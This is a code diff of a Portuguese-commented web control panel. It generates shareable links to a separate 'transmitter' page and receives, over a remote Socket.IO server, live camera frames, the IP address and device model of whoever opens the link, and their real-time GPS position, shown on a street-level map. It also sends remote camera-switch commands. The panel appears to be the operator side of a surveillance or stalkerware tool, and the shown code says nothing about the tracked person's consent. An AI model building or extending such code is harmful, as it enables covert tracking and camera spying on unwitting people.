@@ -69,10 +69,7 @@
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 
 <script>
-  // ✅ SEU SERVIDOR DO RENDER
   const RENDER_URL = "https://maestro-server-si1f.onrender.com";
-  
-  // ✅ ENDEREÇO CORRETO DO TRANSMISSOR COM INDEX.HTML
   const TRANSMITTER_BASE_URL = "https://valtonplay4-sudo.github.io/trasm/index.html";
 
   let currentRoomId = 'sala_' + Math.random().toString(36).substring(2, 9);
@@ -85,18 +82,24 @@
 
   const linkInput = document.getElementById('generatedLink');
   
-  function updateLinkDisplay() {
-    linkInput.value = `${TRANSMITTER_BASE_URL}?id=${currentRoomId}`;
-  }
-
-  document.getElementById('btnGenLink').addEventListener('click', () => {
+  function generateNewRoom() {
     currentRoomId = 'sala_' + Math.random().toString(36).substring(2, 9);
     socket.emit('join-room', currentRoomId);
-    updateLinkDisplay();
-  });
+    linkInput.value = `${TRANSMITTER_BASE_URL}?id=${currentRoomId}`;
+    
+    // Reseta Interface para Novo Transmissor Isolado
+    document.getElementById('remoteImg').style.display = 'none';
+    document.getElementById('placeholder').style.display = 'flex';
+    document.getElementById('statusDot').className = 'dot';
+    document.getElementById('statusText').textContent = 'AGUARDANDO';
+    document.getElementById('txIpPill').textContent = 'IP: ---';
+    document.getElementById('devicePill').textContent = 'APARELHO: ---';
+  }
 
-  // Já exibe o primeiro link ao carregar a página
-  updateLinkDisplay();
+  document.getElementById('btnGenLink').addEventListener('click', generateNewRoom);
+  
+  // Gera a primeira sala ao carregar
+  generateNewRoom();
 
   document.getElementById('btnCopy').addEventListener('click', () => {
     if (!linkInput.value) return;
@@ -104,14 +107,22 @@
     alert("Link copiado com sucesso!");
   });
 
+  // MAPA GLOBAL COM NOME DE BAIRROS E RUAS (OpenStreetMap)
   const map = L.map('map').setView([0, 0], 2);
-  L.tileLayer('https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', { maxZoom: 20 }).addTo(map);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    maxZoom: 19,
+    attribution: '© OpenStreetMap'
+  }).addTo(map);
+
   const radarIcon = L.divIcon({ className: '', html: '<div class="radar-icon"></div>', iconSize: [18, 18] });
   let marker = null;
 
-  // Recebe Frames de Vídeo em Tempo Real
+  // PROCESSA DADOS APENAS SE FOR DA SUA SALA ÚNICA
   socket.on('receive-frame', (data) => {
-    const frame = typeof data === 'object' ? data.frame : data;
+    const rId = data.roomId || (data.data ? data.data.roomId : null);
+    if (rId && rId !== currentRoomId) return; // Filtro de isolamento de sala
+
+    const frame = data.frame || data;
     document.getElementById('placeholder').style.display = 'none';
     const img = document.getElementById('remoteImg');
     img.src = frame;
@@ -120,28 +131,31 @@
     document.getElementById('statusText').textContent = 'ONLINE';
   });
 
-  // Recebe Informações do Dispositivo
   socket.on('receive-info', (data) => {
+    const rId = data.roomId;
+    if (rId && rId !== currentRoomId) return; // Filtro de isolamento de sala
+
     const info = data.info || data;
     if (info.ip) document.getElementById('txIpPill').textContent = `IP: ${info.ip}`;
     if (info.deviceModel) document.getElementById('devicePill').textContent = `APARELHO: ${info.deviceModel}`;
   });
 
-  // Recebe Posição do GPS em Tempo Real
   socket.on('receive-location', (data) => {
+    const rId = data.roomId;
+    if (rId && rId !== currentRoomId) return; // Filtro de isolamento de sala
+
     const loc = data.location || data;
     if (loc && loc.lat) {
       const latLng = [loc.lat, loc.lng];
       if (!marker) {
         marker = L.marker(latLng, { icon: radarIcon }).addTo(map);
-        map.setView(latLng, 18);
+        map.setView(latLng, 17); // Zoom aproximado em nível de bairro/rua
       } else {
         marker.setLatLng(latLng);
       }
     }
   });
 
-  // Comandos para alternar câmera
   document.getElementById('btnCamEnv').addEventListener('click', () => {
     socket.emit('send-command', { roomId: currentRoomId, command: 'environment' });
   });
